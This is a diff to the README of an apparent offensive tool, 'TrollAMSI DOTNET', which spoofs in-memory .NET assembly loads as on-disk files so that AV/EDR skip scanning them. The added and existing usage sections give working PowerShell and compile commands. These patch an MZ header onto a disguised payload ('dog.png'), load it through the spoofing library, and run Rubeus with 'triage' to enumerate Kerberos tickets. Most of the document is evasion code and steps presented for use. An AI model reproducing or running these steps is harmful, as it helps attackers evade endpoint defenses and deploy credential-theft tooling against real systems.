@@ -3,10 +3,11 @@ TrollAMSI only bypasses powershell's amsi and not the CLR amsi during Assembly.L
 
 **Note:** Only .cs version released, you can just compile it to an assembly and load it (refer to trollAMSI) 
 
-## Why is this technique so powerful?
-Because even if you bypass amsi, when you any sort of assembly.load, the byte array is scanned during virtualalloc, etc by the AV/EDR. This spoofs a byte array to appear on disk and the AV/EDR will not re-scan the byte array due to unnecessary overhead, since it is already assumed to be scanned when on disk. 
+## Why is this technique so powerful? (i.e works on many powerful AV/EDR)
+Because even if you bypass amsi, when you do any sort of assembly.load, the byte array is scanned during virtualalloc, etc by the AV/EDR. This spoofs a byte array to appear on disk and the AV/EDR will not re-scan the byte array due to unnecessary overhead, since it is already assumed to be scanned when on disk. 
+
 ![Image](https://github.com/user-attachments/assets/c893ef11-20a5-455a-a62c-1d6a717884fe)
-## Usage 
+## Usage Trollamsidotnet.cs
 ```
 #First download TrollAmsiDOTNET.cs and dog.png (taken from flangvik/SharpCollection nightly build, you can sha1 the bytes before loading to check)
 
@@ -18,6 +19,25 @@ for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $MZHeader[$i] }
 #[string[]]$myargs = "triage","/consoleoutfile:C:\troll\hehe.txt"
 [string[]]$myargs = "triage"
 $entryPoint = ([TrollAmsiDOTNET]::SpoofFileLoad($fileBytes,"Rubeus.exe")).EntryPoint
+$entryPoint.Invoke($null, (,$myargs))
+
+```
+## Usage Trollamsidotnet2.cs
+```
+#This is a more generic library for Trollamsidotnet that works spoofs any files/path (not just assemblies) 
+#Any attempt to read from <path> will now read the $filebytes, so LoadFrom(<path>) works as well
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /optimize /out:TrollAmsiDOTNET2.dll /target:library TrollAmsiDOTNET2.cs > $null
+$MZHeader = [byte[]](0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00)
+$fileBytes = [System.IO.File]::ReadAllBytes("C:\troll\dog.png")
+for ($i = 0; $i -lt 8; $i++) {$fileBytes[$i] = $MZHeader[$i] }
+$path = "c:\users\admin\desktop\blah.txt"
+[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes("C:\troll\TrollAmsiDOTNET2.dll")) > $null
+[TrollAmsiDOTNET2]::SpoofFileOnDisk($path, $fileBytes)
+
+#Do **standard** loading of assembly with LoadFrom and invoke entrypoint
+$entryPoint = ([System.Reflection.Assembly]::LoadFrom($path)).EntryPoint
+[string[]]$myargs = "triage"
 $entryPoint.Invoke($null, (,$myargs))
 
 ```
